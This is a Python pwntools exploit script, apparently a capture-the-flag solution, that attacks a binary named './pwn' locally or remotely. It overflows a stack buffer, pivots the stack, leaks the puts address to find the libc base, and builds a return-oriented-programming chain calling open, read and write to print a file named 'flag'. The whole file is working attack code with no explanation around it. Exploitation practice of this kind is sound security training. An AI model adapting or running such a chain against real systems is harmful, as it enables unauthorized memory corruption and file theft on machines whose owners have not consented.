#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwn', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            # b*main+121
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

gadget_read = 0x4012b8  # aar
control_rdi = 0x401230  # mov rax, qword ptr [rbp - 8]; mov rdi, rax; call 0x30c0; nop; leave; ret;
ret = 0x40101a  # ret;

offset = 112
p.sendlineafter(b'?', b'ksan')
p.sendlineafter(b'!', b'A' * offset + p64(0x404200 + 0x70) + p64(gadget_read))

payload = p64(elf.got.puts)
payload += p64(0x404200 + 0x100)
payload += p64(elf.plt.puts)
payload += p64(gadget_read)
payload = payload.ljust(offset, b'\x00')
payload += p64(0x404208)
payload += p64(control_rdi)

p.sendline(payload)

p.recvline()
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts
log.info(f'Libc base: {hex(libc.address)}')

flag_addr = 0x404500 

pop_rdi = libc.address + 0x000000000010f78b
pop_rsi = libc.address + 0x0000000000110a7d
pop_rdx = libc.address + 0x00000000000b503c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

payload = flat(
    # read 'flag'
    b'A' * offset,
    p64(0x404200 + 0x70), # rbp
    p64(pop_rdi),
    p64(0),  # stdin
    p64(pop_rsi),
    p64(flag_addr),
    p64(pop_rdx),
    p64(0x50),
    p64(0),  # rbx
    p64(0),  # r12
    p64(0),  # r13
    p64(0x404270),  # rbp
    p64(libc.sym.read),
    
    # open
    p64(pop_rdi),
    p64(flag_addr),
    p64(pop_rsi),
    p64(0),
    p64(libc.sym.open),
    
    # read
    p64(pop_rdi),
    p64(3),
    p64(pop_rsi),
    p64(0x404600),
    p64(pop_rdx),
    p64(0x50),
    p64(0),  # rbx
    p64(0),  # r12
    p64(0),  # r13
    p64(0x404270),  # rbp
    p64(libc.sym.read),
    
    # write
    p64(pop_rdi),
    p64(1),
    p64(pop_rsi),
    p64(0x404600),
    p64(pop_rdx),
    p64(0x50),
    p64(0),  # rbx
    p64(0),  # r12
    p64(0),  # r13
    p64(0x404270),  # rbp
    p64(libc.sym.write)
)

p.sendline(payload)
p.sendline(b'flag\x00')
p.interactive()